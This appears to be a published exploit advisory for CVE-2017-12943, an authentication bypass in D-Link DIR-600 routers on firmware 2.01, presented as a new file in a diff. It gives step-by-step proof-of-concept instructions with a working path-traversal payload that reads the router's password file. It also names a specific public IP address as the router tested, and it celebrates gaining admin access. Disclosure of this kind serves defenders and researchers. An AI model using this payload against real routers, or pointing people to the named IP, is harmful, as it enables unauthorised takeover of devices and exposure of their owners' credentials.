@@ -1,0 +1,53 @@
+# Exploit Title: D-Link DIR-600  - Authentication Bypass (Absolute Path Traversal Attack)
+# CVE - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12943
+# Date: 29-08-2017
+# Exploit Author: Jithin D Kurup
+# Contact : https://in.linkedin.com/in/jithin-d-kurup-77b616142
+# Vendor : www.dlink.com
+# Version: Hardware version: B1
+Firmware version: 2.01
+# Tested on:All Platforms
+ 
+ 
+1) Description
+ 
+After Successfully Connected to D-Link DIR-600 
+Router(FirmWare Version : 2.01), Any User Can Easily Bypass The Router's
+Admin Panel Just by adding a simple payload into URL.
+
+D-Link DIR-600 Rev Bx devices with v2.x firmware allow remote attackers to
+read passwords via a model/__show_info.php?REQUIRE_FILE= absolute path traversal attack, 
+as demonstrated by discovering the admin password.
+ 
+Its More Dangerous when your Router has a public IP with remote login
+enabled.
+ 
+ 
+IN MY CASE,
+Tested Router IP : http://190.164.170.249
+ 
+ 
+ 
+Video POC : https://www.youtube.com/watch?v=PeNOJORAQsQ
+ 
+2) Proof of Concept
+ 
+Step 1: Go to
+Router Login Page : http://190.164.170.249:8080
+ 
+Step 2:
+Add the payload to URL.
+
+Payload: model/__show_info.php?REQUIRE_FILE=%2Fvar%2Fetc%2Fhttpasswd
+ 
+
+ 
+Bingooo You got admin Access on router.
+Now you can download/upload settiing, Change setting etc.
+ 
+ 
+ 
+ 
+---------------Greetz----------------
++++++++++++ www.0seccon.com ++++++++++++
+Saran,Dhani,Gem,Vignesh,Hemanth,Sudin,Vijith
